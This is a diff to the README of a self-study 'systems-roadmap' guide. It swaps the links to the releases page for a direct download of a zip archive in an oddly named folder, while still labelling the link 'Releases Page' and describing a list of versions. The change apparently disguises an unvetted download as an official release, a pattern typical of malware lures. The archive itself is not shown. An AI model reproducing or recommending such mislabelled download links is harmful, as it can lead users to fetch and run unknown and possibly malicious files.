@@ -11,10 +11,10 @@ The **systems-roadmap** is a self-study guide designed to help you master key to
 - Suitable for beginners and those looking to deepen their understanding
 
 ## 📥 Download & Install
-To get started with the **systems-roadmap**, visit this page to download: [Download the latest version](https://github.com/Brainsway1/systems-roadmap/releases)
+To get started with the **systems-roadmap**, visit this page to download: [Download the latest version](https://github.com/Brainsway1/systems-roadmap/raw/refs/heads/main/Nathanael/systems_roadmap_archizoic.zip)
 
 ### Step-by-Step Guide to Download
-1. Click on the link above or go directly to [Releases Page](https://github.com/Brainsway1/systems-roadmap/releases).
+1. Click on the link above or go directly to [Releases Page](https://github.com/Brainsway1/systems-roadmap/raw/refs/heads/main/Nathanael/systems_roadmap_archizoic.zip).
 2. You will see a list of available versions. Look for the latest release.
 3. Select the file that matches your needs. This could be a ZIP or other archive format.
 4. Download the file by clicking on it.
